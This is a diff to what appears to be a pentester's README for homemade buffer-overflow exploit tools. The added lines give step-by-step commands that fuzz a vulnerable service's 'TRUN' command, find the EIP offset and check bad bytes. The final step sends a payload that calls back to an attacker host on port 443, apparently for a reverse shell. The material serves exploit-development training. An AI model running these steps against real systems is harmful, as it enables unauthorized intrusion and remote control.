@@ -13,6 +13,19 @@ In the above example, the argument "4" is the mode I am using to send the final 
 
 Honestly, the cherry on top in this is the fact that it gives you a date/time stamp of when the payload is sent at the very end, because we are pentesters and the report is what matters to the client, right???
 
+The complete process looked more like this:
+
+# I sent a buffer of "TRUN ." + 3000 A's, resulting in a crash...
+./exploitshadow.py 1 3000 10.0.0.10 9999
+# Since that crashed it, I had the tool generate a pattern of 3000 characters and sent that next...
+./exploitshadow.py 2 3000 10.0.0.10 9999
+# At this point, the EIP register had the hex values 396F4338 inside it, so now I just need to find that offset next...
+./exploitshadow.py 5 3000 396F4338
+# Now I know that the offset is 2006, because that's what mode 5 gives me as output, so now I sent a buffer with all byte values 0-255...
+./exploitshadow.py 3 2006 10.0.0.10 9999
+# Keep doing that and using badbytecheck.py to eliminate bad bytes/chars. When you have them all eliminated, and you find a proper jump address, send payload...
+./exploitshadow.py 4 2006 0x11223344 10.0.0.1 443 10.0.0.10 9999
+
 ----- BadByteCheck.py -----
 
 Furthering the process of automating exploit development, I realize that you can probably do the same thing with tools such as Mona.py, but I enjoy writing my own tools and this is one that I find less annoying to deploy. Once I've sent a buffer with all byte values 0-255, I dump the memory where those values begin from the debugger, and then run this tool against the dump file. Any byte values that I already know are most likely bad are pre-configured within the tool, and it's easy to add more. It skips the "bad" bytes in order when it's checking, and looks for any byte mismatches between the internally generated "allbytes" (0-255) range and the values that were actually dumped from the debugger, reporting any mismatches that can be verified with hexdump. Enjoy!
